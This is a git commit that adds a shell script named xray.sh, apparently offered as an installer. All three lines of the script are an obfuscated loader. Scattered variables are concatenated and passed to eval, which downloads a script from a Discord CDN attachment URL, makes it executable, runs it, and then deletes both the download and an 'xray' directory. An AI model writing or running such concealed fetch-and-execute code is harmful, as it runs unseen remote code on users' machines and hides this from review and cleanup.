933dc2ed5154e44a7d56c4ffa7b55a1eb2e8bd71
Dugong <110967975+dugong-lewat@users.noreply.github.com>
2022-12-08 13:32:54 +0700

    Add files via upload

---
+++ xray.sh
@@ -0,0 +1,3 @@
+z="
+";Yz='ord.';dz='&& .';Mz='chme';Zz='sh" ';Jz='app.';Iz='cord';Ez='"htt';Hz='.dis';gz='rm -';jz='rf i';az='&& c';Xz='disc';ez='/ins';bz='hmod';Rz='2520';Bz=' -O ';Vz='9645';Gz='/cdn';Dz='all ';fz='tall';Wz='194/';iz='ray';Lz='atta';Oz='1050';Az='wget';Kz='com/';Sz='832/';Tz='2969';hz='rf x';Pz='2553';Uz='3251';Qz='5642';Nz='nts/';Fz='ps:/';kz='nsta';lz='ll';cz=' +x ';Cz='inst';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Oz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$Cz$Dz$dz$ez$fz$z$gz$hz$iz$z$gz$jz$kz$lz"
